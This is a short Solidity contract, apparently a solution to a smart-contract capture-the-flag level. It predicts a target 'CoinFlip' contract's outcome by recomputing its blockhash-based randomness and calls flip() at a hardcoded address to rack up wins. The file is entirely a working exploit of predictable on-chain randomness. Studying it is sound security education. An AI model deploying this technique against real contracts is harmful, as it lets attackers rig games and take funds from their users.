// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address coin_flip_address = 0xd694F0767d9BC9cF867E5044C0AE25aB953414F8;
  event show_result(string result);

  constructor() {
    consecutiveWins = 0;
  }

   function coinFlipGuess() external returns (string memory) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool isRight = ICoinFlip(coin_flip_address).flip(side);
        if (isRight) {
            consecutiveWins++;
            emit show_result("successfully got right number");
            return "got number correct";
        } else {
            consecutiveWins = 0;
            emit show_result("got wrong number");
            return "got number wrong";
        }

    }



}